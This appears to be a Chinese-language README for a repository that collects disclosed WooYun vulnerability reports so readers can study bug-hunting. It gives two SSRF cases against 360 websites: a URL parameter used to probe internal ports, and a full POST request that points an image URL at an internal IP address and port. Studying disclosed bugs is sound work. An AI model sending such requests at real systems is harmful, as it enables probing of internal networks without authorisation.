# vulnerability-review
寻找公开漏洞案例进行复盘学习。
在模仿中学习挖洞姿势！

漏洞来源：
```
wooyun漏洞库
```
## 漏洞列表
### SSRF(服务器端请求伪造)
##### [wooyun-2016-0227704-当当网某站点SSRF可以遍历本地文件](https://wooyun.laolisafe.com/bug_detail.php?wybug_id=wooyun-2016-0227704) √
##### [wooyun-2014-083592-利用两个鸡肋SSRF探测360内网](https://wooyun.laolisafe.com/bug_detail.php?wybug_id=wooyun-2014-083592)
详细说明：
两个SSRF都比较鸡肋，但仍值得一试。
第一个SSRF位于：
```
http://te.tuan.360.cn/checkapi_ajax.html?apiurl=http://soft.corp.qihoo.net
```
只能返回HTTP Status。可以探测指定的端口是否开放web服务（如80,8360,8080，8000），以及相应的资源是否存在。
第二个SSRF位于diy主题：
```
POST /diy/sl/themes/getpreview HTTP/1.1
Content-Length: 862
Content-Type: application/x-www-form-urlencoded
Cookie: sc=52cfa2a2123cceed13f31e75.THEME.1
Host: meihua.360.cn
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
Accept: */*
data=%7b%22banner%22:%7b%22url%22:%22http://img1.mobile.360.cn/c0/cdn/baibian/themeResource/image/banner/2655e631-ed27-4d1e-9e14-76a91c50b528.png%22%7d%2c%22default_lock_wallpaper%22:%7b%22url%22:%22http:%5c/%5c/220.181.156.221:8360/favicon.ico%22%7d%2c%22incharge%22:%7b%22color%22:%22FFFFFF%22%2c%22size%22:18%7d%2c%22status_bar%22:%7b%22url%22:%22http://p2.qhimg.com/t01e34730d2f2f6a5be.png%22%7d%2c%22txt_clock%22:%7b%22color%22:%22FFFFFF%22%2c%22size%22:64%7d%2c%22txt_date%22:%7b%22color%22:%22FFFFFF%22%2c%22size%22:20%7d%2c%22unlock_button%22:%7b%22url%22:%22http://img1.mobile.360.cn/c0/cdn/baibian/themeResource/image/unlock_button/837bad4f-ed18-41fd-b2f3-4faa1b5fa9fd.png%22%7d%2c%22unlock_button_selected%22:%7b%22url%22:%22http://img1.mobile.360.cn/c0/cdn/baibian/themeResource/image/unlock_button_selected/c2ea4be6-c76f-4cfb-9573-a5c3e7617742.png%22%7d%7d
```
default_lock_wallpaper.url等多个参数均可以构造。可以把我们指定URL的图片合成到一张新图片上。

### CSRF(跨站请求伪造)

### Refected XSS(反射型XSS)

### Stored XSS(存储型XSS)


